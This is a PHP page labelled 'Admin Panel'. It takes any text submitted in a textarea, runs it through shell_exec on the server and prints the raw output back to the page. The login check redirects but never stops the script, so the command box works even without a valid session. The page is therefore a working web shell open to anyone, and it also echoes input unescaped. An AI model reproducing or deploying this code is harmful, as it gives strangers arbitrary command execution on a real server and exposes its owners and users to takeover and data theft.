
 <?php
session_start();
if($_SESSION['status']!="1"){
	header("Location: 404.php");
}
?>
<!-- NerdOfCode -->
<html>
  <head>
    <title>Admin Panel</title>
    <link rel="stylesheet" type="text/css" href="newstyle.css">
    <meta HTTP-EQUIV="refresh" CONTENT="300;URL=logout.php">
  </head>
  <body>
    <h1 style="text-align:center;">Admin Panel</h1>
    <div id="blueLink">
    <a href="logout.php">Logout</a>&ensp;
    <a href="options.php">Home</a><hr>
    </div>
    <style>
      textarea.formshell{
        align: center;
        background-color: #0E1019;
        color: white;
        width: calc(360px + (1120 - 360) * ((100vw - 500px) / (1920 - 500)));
        height: calc(200px + (300 - 300) * ((100vw - 500px) / (1920 - 500)));
      }
    </style>
    <form action="" name="query" id="query" method="post">
    	<textarea id="query_box" name="query_box" placeholder="Ex: whoami" class="formshell"></textarea><br><br>   
    	<button type="Submit" value="Submit">Submit</button>
    </form>
    <!-- <script>
      function usl(e) { if(e.keyCode == 13) document.enter.submit(); }
    </script> -->
<script>
var input = document.getElementById('query_box');
input.focus();
input.select();
</script>


<?php
$cwd=getcwd();
echo "<br>Current directory: $cwd<br>";
$shell = $_POST['query_box'];
if (!empty($_POST['query_box'])) {
	//Run the shell command
	$run = shell_exec("$shell");
	echo "<br><b>Output: </b><br>";
	echo "<pre>$run</pre>";
	$_SESSION['run_seperate']="$shell";
	include "mysql.php";
}else{
	echo "<b>Nothing has been run yet.</b>";	
}
?>  
</body>
</html>
